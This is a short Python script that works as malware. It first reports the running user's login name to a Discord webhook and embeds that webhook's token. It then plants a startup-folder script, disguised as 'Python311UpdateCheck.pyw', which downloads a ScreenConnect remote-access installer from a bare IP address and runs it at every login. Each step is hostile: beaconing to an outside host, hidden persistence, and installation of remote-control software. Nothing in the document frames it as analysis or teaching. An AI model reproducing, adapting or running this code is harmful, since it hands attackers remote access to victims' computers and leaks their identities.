import os
import json
import urllib.request

try:
    url = 'https://discord.com/api/webhooks/1419779190399569940/TTmoY4jWra0wwRca21U8RIEvesch8duCqnCcQxxDF28i1UNCB09oDOZ3FVVMwJW-5oK2'
    data = {'content': f'Ran by {os.getlogin()}'}
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0'
    }
    req = urllib.request.Request(url, data=json.dumps(data).encode(), headers=headers)
    urllib.request.urlopen(req)
except Exception as e:
    print(e)

code = """
import threading
import urllib.request
import json 
import os
import tempfile

def download_and_run(url):
    temp_dir = tempfile.gettempdir()
    file_path = os.path.join(temp_dir, 'ScreenConnect.ClientSetup.msi')
    with urllib.request.urlopen(url) as response, open(file_path, 'wb') as out_file:
        while True:
            chunk = response.read(8192)
            if not chunk:
                break
            out_file.write(chunk)
    os.startfile(file_path)

url = 'http://87.121.84.32:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
thread = threading.Thread(target=download_and_run, args=(url,))
thread.start()
"""

startup = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup')
with open(os.path.join(startup, 'Python311UpdateCheck.pyw'), 'w') as f:
    f.write(code)
